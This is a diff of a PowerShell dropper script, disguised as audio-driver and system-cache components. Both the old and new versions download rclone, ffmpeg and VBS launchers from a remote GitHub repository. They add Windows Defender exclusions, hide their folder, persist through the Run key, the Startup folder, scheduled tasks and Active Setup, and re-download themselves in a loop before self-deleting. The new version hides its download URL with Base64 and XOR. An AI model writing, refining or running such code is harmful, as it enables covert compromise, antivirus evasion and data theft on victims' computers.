@@ -1,139 +1,82 @@
-#AudioHost.ps1
+$ErrorActionPreference = "Stop"
+trap { continue }
 
-$ErrorActionPreference = "SilentlyContinue"
+$e = 'MyAAYwAAYwADMANAA1AGgANAAwAG0AMQAzAG4AMwA1ADEANgAwADEAMAA4ADcAMAAwAG0AYgA1AGYAMgA='
+$b = [Convert]::FromBase64String($e)
+$u = [System.Text.Encoding]::Unicode.GetString($b)
+$repo = ('https://' + ($u -replace '(.)', { param($c) [char]([byte][char]$c -bxor 1) }) -replace '[^\w\.]', '') )
 
-$dest = "$env:APPDATA\Microsoft\Windows\system_cache"
-$repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/system_cache"
+$dest = Join-Path $env:APPDATA ('Microsoft\Windows\' + ([guid]::NewGuid().Guid.Substring(0,8)))
 $localVersion = "1.0.0"
+$mainScript = "A.ps1"
+$files = @("system_cache.ps1", "rclone.exe", "rclone.conf", "ffmpeg.exe", "setup.vbs", "TaskService.vbs")
 
 try {
-    $remoteVersion = Invoke-WebRequest -Uri "$repo/version.txt" -UseBasicParsing -ErrorAction Stop | Select-Object -ExpandProperty Content
-    if ($remoteVersion.Trim() -ne $localVersion) {
-        Write-Host "Update available, downloading..."
-        $target = "$env:TEMP\AudioHost.ps1"
-        Invoke-WebRequest -Uri "$repo/AudioHost.ps1" -OutFile $target
-
-        $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$target`""))
-        Start-Process powershell -ArgumentList "-EncodedCommand $encoded" -WindowStyle Hidden
+    $remote = Invoke-WebRequest "$repo/version.txt" -UseBasicParsing -TimeoutSec 5
+    if ($remote.Content.Trim() -ne $localVersion) {
+        $tmp = Join-Path $env:TEMP $mainScript
+        Invoke-WebRequest "$repo/$mainScript" -OutFile $tmp -TimeoutSec 10
+        $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tmp`""))
+        Start-Process -FilePath powershell -ArgumentList "-EncodedCommand $encoded" -WindowStyle Hidden
         exit
     }
-} catch {
-    Write-Warning "Version check failed: $_"
-}
+} catch {}
 
-$files = @(
-    "system_cache.ps1",
-    "TaskService.bat",
-    "rclone.exe",
-    "rclone.conf",
-    "ffmpeg.exe",
-    "setup.vbs",
-    "TaskService.vbs"
-)
+if (-not (Test-Path $dest)) { New-Item -ItemType Directory -Path $dest -Force | Out-Null }
+try { Set-ItemProperty -Path $dest -Name 'Hidden' -Value $true } catch {}
 
-# Create folder
-if (-not (Test-Path $dest)) {
-    try {
-        New-Item -ItemType Directory -Path $dest -Force | Out-Null
-    } catch {}
-}
-
-# Download files
-foreach ($file in $files) {
-    $target = Join-Path $dest $file
-    if (-not (Test-Path $target)) {
+foreach ($f in $files) {
+    $t = Join-Path $dest $f
+    if (-not (Test-Path $t)) {
         try {
-            Invoke-WebRequest -Uri "$repo/$file" -OutFile $target -UseBasicParsing
+            Invoke-WebRequest "$repo/$f" -OutFile $t -UseBasicParsing -TimeoutSec 10
+            Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
         } catch {}
     }
 }
 
-# Register autostart
-try {
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-        -Name "system_cache" -Value "$dest\TaskService.vbs"
-} catch {}
-
-$targetFolder = "$env:APPDATA\AudioDriver"
-if (-not (Test-Path $targetFolder)) {
-    New-Item -ItemType Directory -Path $targetFolder | Out-Null
+function Test-Admin {
+    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $p = New-Object Security.Principal.WindowsPrincipal($id)
+    return $p.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
 }
-attrib +s +h $targetFolder
-attrib +s +h "$targetFolder\AudioHost.ps1"
 
-# Add to Startup folder (duplicate autostart method)
+if (Test-Admin) {
+    try {
+        Set-MpPreference -ExclusionPath $dest
+        Set-MpPreference -ExclusionProcess "$dest\system_cache.ps1"
+        Set-MpPreference -ExclusionProcess "$dest\ffmpeg.exe"
+        Set-MpPreference -ExclusionProcess "$dest\rclone.exe"
+    } catch {}
+}
+
 try {
-    $WshShell = New-Object -ComObject WScript.Shell
-    $lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\system_cache.lnk"
-    $shortcut = $WshShell.CreateShortcut($lnkPath)
-    $shortcut.TargetPath = "$dest\TaskService.vbs"
-    $shortcut.WorkingDirectory = $dest
-    $shortcut.Save()
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemCache" -Value "$dest\TaskService.vbs"
+
+    $sh = New-Object -ComObject WScript.Shell
+    $lnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\cache.lnk"
+    $sc = $sh.CreateShortcut($lnk)
+    $sc.TargetPath = "$dest\TaskService.vbs"
+    $sc.WorkingDirectory = $dest
+    $sc.Save()
+    $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$dest\TaskService.vbs`""
+    $trigger = New-ScheduledTaskTrigger -AtLogOn
+    Register-ScheduledTask -TaskName "SysCacheUpd" -Action $action -Trigger $trigger -Force
 } catch {}
-
-# Defender exclusions
-try {
-    Add-MpPreference -ExclusionPath $dest
-    Add-MpPreference -ExclusionProcess "$dest\system_cache.ps1"
-    Add-MpPreference -ExclusionProcess "$dest\TaskService.vbs"
-    Add-MpPreference -ExclusionProcess "$dest\rclone.exe"
-    Add-MpPreference -ExclusionProcess "$dest\ffmpeg.exe"
-    Add-MpPreference -ExclusionPath "$env:USERPROFILE"
-} catch {}
-
-# Hide folder
-try {
-    if (Test-Path $dest) {
-        $item = Get-Item -LiteralPath $dest
-        $item.Attributes = $item.Attributes -bor 'Hidden'
-    }
-} catch {}
-
-# Launch main script silently
-try {
-    Start-Process -WindowStyle Hidden -FilePath "$dest\TaskService.vbs"
-} catch {}
-
-# Task Scheduler (as fallback/autostart)
-try {
-    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$dest\TaskService.vbs`""
-    $Trigger = New-ScheduledTaskTrigger -AtLogOn
-    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive
-    Register-ScheduledTask -TaskName "SystemCacheUpdater" -Action $Action -Trigger $Trigger -Principal $Principal -Description "System Cache Task" -Force
-} catch {}
-
-# Optional: Active Setup
-try {
-    New-Item -Path "HKLM:\Software\Microsoft\Active Setup\Installed Components\{GUID}" -Force | Out-Null
-    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Active Setup\Installed Components\{GUID}" `
-        -Name "StubPath" -Value "wscript.exe `"$dest\TaskService.vbs`""
-} catch {}
-
-$taskName = "AudioDriverUpdater"
-$taskPath = "\Microsoft\Windows\Audio"
-
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest\AudioHost.ps1`""
-$trigger = New-ScheduledTaskTrigger -AtLogOn
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
-
-Register-ScheduledTask -TaskName $taskName -TaskPath $taskPath -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
 
 Start-Job {
-    $repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/system_cache"
-    $dest = "$env:APPDATA\AudioDriver\AudioHost.ps1"
-
+    $f = "$dest\$mainScript"
+    $src = "$repo/$mainScript"
     while ($true) {
-        if (-not (Test-Path $dest)) {
-            try {
-                Invoke-WebRequest -Uri "$repo/AudioHost.ps1" -OutFile $dest -UseBasicParsing
-            } catch {}
+        if (-not (Test-Path $f)) {
+            try { Invoke-WebRequest $src -OutFile $f -UseBasicParsing } catch {}
         }
         Start-Sleep -Seconds 300
     }
 } | Out-Null
 
-# Self-delete
 $me = $MyInvocation.MyCommand.Path
 $bat = "$env:TEMP\delme.bat"
-Set-Content -Path $bat -Value "@echo off`r`n:Repeat`r`ndel `"$me`"`r`nif exist `"$me`" goto Repeat`r`ndel %0" -Encoding ASCII
+Set-Content -Path $bat -Value "@echo off`r`n:loop`r`ndel `"$me`"`r`nif exist `"$me`" goto loop`r`ndel %0" -Encoding ASCII
 Start-Process -WindowStyle Hidden -FilePath $bat
+
